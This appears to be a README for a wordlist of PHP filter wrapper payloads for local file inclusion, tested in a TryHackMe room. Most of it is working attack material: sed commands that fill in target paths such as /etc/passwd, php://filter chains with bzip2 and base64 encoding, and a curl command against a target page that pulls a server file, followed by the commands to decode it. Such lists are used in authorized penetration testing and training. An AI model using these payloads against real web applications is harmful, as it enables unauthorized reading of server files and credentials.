# LFI PHP wrapper 
## `LFI-PHP-wrapper.txt`
- Tested against the playground in https://tryhackme.com/room/filepathtraversal
- The payload list given in `LFI-PHP-wrapper.txt` should be modified by replacing the placedholder (`*`) with a common filename, such as `index.php` or `/etc/passwd`.

```shell
$ sed 's/*/index.php/g' [lfi-php-wrapper-txt-filename] > lfi-php-wrappers-custom.txt
$ sed 's/*/\/etc\/passwd/g' [lfi-php-wrapper-txt-filename] > lfi-php-wrappers-custom.txt
```

Eg.

1. `php://filter/convert.base64-encode/resource=*` -> `php://filter/convert.base64-encode/resource=index.php`
2. `php://filter/convert.base64-encode/resource=*` -> `php://filter/convert.base64-encode/resource=/etc/passwd`
   
> For more comprehensive testing, the placeholder can be combined with the payload in dedicated LFI/path-traversal payload list (`LF.md`, etc.). This would effectively combine the capabilities of both wordlists.


## Examples of working payload
1. ***bzip2 + base64 encode***
```php
php://filter/bzip2.compress|convert.base64-encode/resource=*
php://filter/read=bzip2.compress|convert.base64-encode/resource=*
```
- This will output a base64-encoded value that gives a bzip2 compressed data when decoded

Eg.
```shell
$ curl https://[target].com/page?=php://filter/bzip2.compress|convert.base64-encode/resource=/etc/passwd > output.txt

# extract base64 string
$ cat output.txt

$ echo [base64 string] | base64 -d | bzip2 -d
...
```
